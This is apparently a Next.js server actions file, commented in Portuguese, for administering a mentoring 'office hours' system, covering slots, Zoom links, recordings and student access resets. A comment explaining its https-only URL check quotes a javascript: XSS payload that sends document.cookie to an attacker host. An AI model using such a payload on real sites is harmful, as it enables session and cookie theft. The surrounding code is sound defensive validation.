"use server";

/**
 * Plantão de Dúvidas — Acelera Holding. Server Actions do ADMIN.
 *
 * ⚠️ NÃO é o "agendamento de reunião com a equipe", removido em 10/08/2026
 * (commit b457005) e PROIBIDO de reconstruir.
 *
 * Toda ação abre com `getContextoSessao()` — `papel !== "admin"` sai
 * (render-time gating não é fronteira de segurança; a proteção real é o
 * `public.gp_is_admin()` das policies RLS, mas a checagem aqui evita uma
 * viagem ao banco à toa e devolve erro cedo).
 */

import { revalidatePath } from "next/cache";
import { createClient } from "@/lib/supabase/server";
import { getContextoSessao } from "@/lib/auth";
import type { ResultadoAcao } from "@/lib/plantao-tipos";

async function ehAdmin(): Promise<boolean> {
  const ctx = await getContextoSessao();
  return ctx?.papel === "admin";
}

export interface CriarSlotInput {
  mentoraId: string;
  data: string; // "YYYY-MM-DD"
  horaInicio: string; // "HH:MM"
  duracaoMin: number;
  observacao?: string;
}

export async function criarSlot(input: CriarSlotInput): Promise<ResultadoAcao> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  const supabase = await createClient();
  const { error } = await supabase.schema("gps").from("plantao_slots").insert({
    mentora_id: input.mentoraId,
    data: input.data,
    hora_inicio: input.horaInicio,
    duracao_min: input.duracaoMin,
    observacao: input.observacao?.trim() || null,
  });

  if (error) {
    // unique(mentora_id, data, hora_inicio)
    if (error.code === "23505") {
      return { ok: false, erro: "Já existe um plantão desta mentora nesta data e horário." };
    }
    return { ok: false, erro: "Não foi possível criar o plantão." };
  }

  revalidatePath("/admin/plantao");
  return { ok: true };
}

/**
 * Valida a URL da sala antes de gravar.
 *
 * ⚠️ O link vira `<a href>` clicável para todos os inscritos. Sem esta trava,
 * um valor como `javascript:fetch('https://atacante/?c='+document.cookie)`
 * seria gravado e renderizado — React NÃO neutraliza `javascript:` em `href`.
 * A Server Action é um endpoint HTTP: o `<select>`/`<input>` da tela não é
 * fronteira, a validação precisa morar aqui.
 *
 * Só `https://` passa. Devolve a URL limpa, ou `null` para campo vazio, ou
 * `{ erro }` quando o valor é inválido.
 */
function validarZoomUrl(
  valor: string | undefined,
): { url: string | null } | { erro: string } {
  const limpo = valor?.trim() ?? "";
  if (!limpo) return { url: null };

  let parsed: URL;
  try {
    parsed = new URL(limpo);
  } catch {
    return { erro: "O link da sala precisa ser um endereço válido começando com https://" };
  }

  if (parsed.protocol !== "https:") {
    return { erro: "O link da sala precisa começar com https://" };
  }

  return { url: parsed.toString() };
}

export interface EditarSlotInput {
  slotId: string;
  mentoraId: string;
  data: string;
  horaInicio: string;
  duracaoMin: number;
  zoomUrl?: string;
  observacao?: string;
}

export async function editarSlot(input: EditarSlotInput): Promise<ResultadoAcao> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  const zoom = validarZoomUrl(input.zoomUrl);
  if ("erro" in zoom) return { ok: false, erro: zoom.erro };

  const supabase = await createClient();
  const { error } = await supabase
    .schema("gps")
    .from("plantao_slots")
    .update({
      mentora_id: input.mentoraId,
      data: input.data,
      hora_inicio: input.horaInicio,
      duracao_min: input.duracaoMin,
      zoom_url: zoom.url,
      observacao: input.observacao?.trim() || null,
    })
    .eq("id", input.slotId);

  if (error) {
    if (error.code === "23505") {
      return { ok: false, erro: "Já existe um plantão desta mentora nesta data e horário." };
    }
    return { ok: false, erro: "Não foi possível salvar as alterações." };
  }

  revalidatePath("/admin/plantao");
  return { ok: true };
}

/**
 * Publica (ou despublica) um slot. Publicar exige `zoom_url` preenchido —
 * senão o aluno veria um plantão que ninguém consegue acessar.
 */
export async function publicarSlot(
  slotId: string,
  publicado: boolean,
): Promise<ResultadoAcao> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  const supabase = await createClient();

  if (publicado) {
    const { data: slot } = await supabase
      .schema("gps")
      .from("plantao_slots")
      .select("zoom_url")
      .eq("id", slotId)
      .maybeSingle();

    if (!slot?.zoom_url || !slot.zoom_url.trim()) {
      return { ok: false, erro: "Cadastre o link do Zoom antes de publicar." };
    }
  }

  const { error } = await supabase
    .schema("gps")
    .from("plantao_slots")
    .update({ publicado })
    .eq("id", slotId);

  if (error) return { ok: false, erro: "Não foi possível atualizar a publicação." };

  revalidatePath("/admin/plantao");
  return { ok: true };
}

/**
 * Remove um slot. `on delete cascade` em `plantao_inscricoes` apaga as
 * inscrições junto — por isso só permite remover slots ainda sem inscrito
 * ativo, para não apagar histórico de presença/NPS silenciosamente.
 */
export async function removerSlot(slotId: string): Promise<ResultadoAcao> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  const supabase = await createClient();

  const { count } = await supabase
    .schema("gps")
    .from("plantao_inscricoes")
    .select("id", { count: "exact", head: true })
    .eq("slot_id", slotId)
    .is("cancelado_em", null);

  if (count && count > 0) {
    return {
      ok: false,
      erro: "Este plantão tem inscritos ativos. Cancele as inscrições antes de remover.",
    };
  }

  const { error } = await supabase.schema("gps").from("plantao_slots").delete().eq("id", slotId);
  if (error) return { ok: false, erro: "Não foi possível remover o plantão." };

  revalidatePath("/admin/plantao");
  return { ok: true };
}

export async function salvarGravacao(
  slotId: string,
  gravacaoUrl: string,
): Promise<ResultadoAcao> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  // Mesma trava do `zoom_url`: a gravação vira `<a href>` no painel, e React
  // não neutraliza `javascript:`. Só admin escreve e só admin vê, mas manter
  // dois critérios diferentes para o mesmo tipo de campo é como um deles
  // acaba esquecido depois.
  const gravacao = validarZoomUrl(gravacaoUrl);
  if ("erro" in gravacao) {
    return { ok: false, erro: "O link da gravação precisa começar com https://" };
  }

  const supabase = await createClient();
  const { error } = await supabase
    .schema("gps")
    .from("plantao_slots")
    .update({ gravacao_url: gravacao.url })
    .eq("id", slotId);

  if (error) return { ok: false, erro: "Não foi possível salvar a gravação." };

  revalidatePath("/admin/plantao");
  return { ok: true };
}

/**
 * Roda a carga dos compradores ativos do Acelera Holding
 * (`src/lib/plantao-carga.ts`) a partir do painel. Ver ali as regras de
 * upsert idempotente (nunca desativa por ausência, nunca sobrescreve
 * preenchido com vazio, nunca toca acessos/inscrições).
 */
export async function carregarLoteAcelera(): Promise<
  ResultadoAcao & { inseridos?: number; atualizados?: number; inalterados?: number }
> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  const { carregarAcelera } = await import("@/lib/plantao-carga");
  const resultado = await carregarAcelera();

  revalidatePath("/admin/plantao");
  return { ok: true, ...resultado };
}

/** Revoga o acesso: desativa o aluno e apaga TODAS as sessões dele. */
export async function revogarAcessoPlantao(alunoPlantaoId: string): Promise<ResultadoAcao> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  const supabase = await createClient();

  const { error: erroSessoes } = await supabase
    .schema("gps")
    .from("plantao_sessoes")
    .delete()
    .eq("aluno_plantao_id", alunoPlantaoId);
  if (erroSessoes) return { ok: false, erro: "Não foi possível revogar as sessões." };

  const { error } = await supabase
    .schema("gps")
    .from("plantao_alunos")
    .update({ ativo: false })
    .eq("id", alunoPlantaoId);
  if (error) return { ok: false, erro: "Não foi possível revogar o acesso." };

  revalidatePath("/admin/plantao");
  return { ok: true };
}

export async function reativarAcessoPlantao(alunoPlantaoId: string): Promise<ResultadoAcao> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  const supabase = await createClient();
  const { error } = await supabase
    .schema("gps")
    .from("plantao_alunos")
    .update({ ativo: true })
    .eq("id", alunoPlantaoId);
  if (error) return { ok: false, erro: "Não foi possível reativar o acesso." };

  revalidatePath("/admin/plantao");
  return { ok: true };
}

/**
 * Apaga a credencial do aluno (não o cadastro): no próximo login, o e-mail
 * cadastrado passa de novo pelo fluxo de "1º acesso" e a senha digitada vira
 * a nova credencial. Espelha o `limparSenha` que o Marcio já conhece do
 * `GerenciarAcesso` do aluno do GPS.
 */
export async function limparSenha(alunoPlantaoId: string): Promise<ResultadoAcao> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  const supabase = await createClient();

  const { error: erroSessoes } = await supabase
    .schema("gps")
    .from("plantao_sessoes")
    .delete()
    .eq("aluno_plantao_id", alunoPlantaoId);
  if (erroSessoes) return { ok: false, erro: "Não foi possível encerrar as sessões." };

  const { error } = await supabase
    .schema("gps")
    .from("plantao_acessos")
    .delete()
    .eq("aluno_plantao_id", alunoPlantaoId);
  if (error) return { ok: false, erro: "Não foi possível limpar a senha." };

  revalidatePath("/admin/plantao");
  return { ok: true };
}

/**
 * Libera UM primeiro acesso sem conferência de documento.
 *
 * O primeiro acesso exige os 4 últimos dígitos do documento da compra — é o
 * que impede alguém que só saiba o e-mail de tomar a conta de quem ainda não
 * entrou. Mas 46 dos 421 vieram do CSV sem documento, e há quem tenha
 * comprado com um documento e lembre de outro. Para esses, o admin libera
 * caso a caso, depois de confirmar a identidade por fora (WhatsApp, e-mail).
 *
 * A liberação vale para UM acesso: assim que a senha é criada, ela se
 * consome sozinha (ver `gps.plantao_login`). Não vira porta aberta.
 */
export async function liberarPrimeiroAcesso(
  alunoPlantaoId: string,
): Promise<ResultadoAcao> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  const supabase = await createClient();
  const { error } = await supabase
    .schema("gps")
    .rpc("plantao_liberar_primeiro_acesso", {
      p_aluno_plantao_id: alunoPlantaoId,
    });

  if (error) return { ok: false, erro: "Não foi possível liberar o acesso." };

  revalidatePath("/admin/plantao");
  return { ok: true };
}
